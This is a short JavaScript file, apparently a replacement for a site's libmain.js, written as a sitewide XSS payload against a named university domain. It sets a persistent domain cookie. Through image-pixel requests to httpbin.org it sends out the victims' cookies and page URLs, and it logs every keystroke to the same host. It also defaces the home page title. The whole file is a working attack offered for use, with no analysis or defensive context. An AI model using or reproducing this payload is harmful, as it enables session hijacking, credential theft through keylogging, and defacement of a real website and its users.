// YOUR EXISTING libmain.js → REPLACE with this:
(function(){
    console.log(' libmain loaded!');
    
    // COOKIE PERSISTENCE
    document.cookie = 'xss_hacked=1;path=/;domain=.mgkvp.ac.in';
    
    // SITEWIDE EXECUTION
    if(document.cookie.includes('xss_hacked=1')){
        console.log('🌐 SITEWIDE XSS ACTIVE on:', window.location.href);
        
        // Data exfil (NO CORS)
        var pixel = new Image();
        pixel.src='https://httpbin.org/image/png?data='+btoa(document.cookie+'|'+location.href);
        
        // KEYLOGGER EVERY PAGE
        document.onkeydown = function(e){
            new Image().src='https://httpbin.org/image/png?key='+btoa(e.key);
        };
        
        // HOME PAGE DETECTION
        if(location.href.includes('mgkvp.ac.in') && !location.href.includes('pageContentDetails')){
            console.log('🏠 HOME PAGE ');
            document.title = 'XSS Owned by H';
        }
    }
})();
